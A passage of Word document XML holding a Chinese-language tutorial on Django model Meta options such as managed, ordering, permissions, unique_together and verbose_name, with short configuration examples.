          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>或</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> DateTimeField </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>字段的名字</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若提供该选项</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该模块将拥有一个</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> get_latest() </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>函数以得到</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最新的</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对象</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依据那个字段</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31805471"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get_latest_by = "order_date"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23344FE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managed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E99354"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由于</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会自动根据模型类生成映射的数据库表，如果你不希望</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这么做，可以把</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>managed</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的值设置为</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>False</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23C5CB85"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默认值为</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>True,</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>这个选项为</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>True</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>时</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可以对数据库表进行</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>或</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>migrations</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、删除等操作。在这个时间</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将管理数据库中表的生命周期</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="761D6429"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如果为</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>False</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的时候，不会对数据库表进行创建、删除等操作。可以用于现有表、数据库视图等，其他操作是一样的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="609877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order_with_respect_to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5431086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这个选项一般用于多对多的关系中，它指向一个关联对象。就是说关联对象找到这个对象后它是经过排序的。指定这个属性后你会得到一个</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>get_XXX_order()</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>set_XXX_order</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>（）的方法</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通过它们你可以设置或者回去排序的对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="781CB08F"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举例来说</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如果一个</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> PizzaToppping </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>关联到一个</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Pizza </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象</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这样做</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FAE46EC"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order_with_respect_to = 'pizza'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BE3B801"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就允许</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> toppings </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>依照相关的</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> pizza </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>来排序</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A16EA5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ordering</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C28B543"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这个字段是告诉</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>模型对象返回的记录结果集是按照哪个字段排序的。比如下面的代码：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70BECB3D"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ordering=['order_date'] </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6287E5C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按订单升序排列</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12863466"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lastRenderedPageBreak/>
        <w:t>ordering=['-order_date'] </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4194D644"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按订单降序排列，</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表示降序</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05ECC4CD"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ordering=['?order_date'] </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="674694A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随机排序，？表示随机</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C0F27B"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ordering = ['-pub_date', 'author']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A23142E"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对</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> pub_date </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>降序</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然后对</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> author </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>升序</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EC9E4B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需要注意的是</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不论你使用了多少个字段排序</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">, admin </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>只使用第一个字段</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3258A05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permissions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D0D061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permissions</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>主要是为了在</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django Admin</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>管理模块下使用的，如果你设置了这个属性可以让指定的方法权限描述更清晰可读。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47AFBFA7"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要创建一个对象所需要的额外的权限</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如果一个对象有</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> admin </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>设置</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则每个对象的添加</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删除和改变权限会人</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依据该选项</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自动创建</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下面这个例子指定了一个附加权限</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>: can_deliver_pizzas:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C5849F4"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permissions = (("can_deliver_pizzas", "Can deliver pizzas"),)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2219D8C7"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这是一个</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>2-</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>元素</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> tuple </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>tuple</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>或列表</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>其中两</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>2-</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>元素</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> tuple </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的格式为</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>:(permission_code, human_readable_permission_name).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549E1A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unique_together</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="506D0E94"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unique_together</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>这个选项用于：当你需要通过两个字段保持唯一性时使用。这会在</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django admin </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>层和数据库层同时做出限制</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也就是相关的</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> UNIQUE </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>语句会被包括在</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> CREATE TABLE </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>语句中</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。比如：一个</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Person</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>FirstName</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>LastName</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>两者的组合必须是唯一的，那么需要这样设置：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02D51391"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unique_together = (("first_name", "last_name"),)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="435C664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verbose_name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ACDCD3A"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verbose_name</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的意思很简单，就是给你的模型类起一个更可读的名字：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54470375"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verbose_name = "pizza"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="435C9418"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若未提供该选项</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">, Django </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>则会用一个类名字的</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
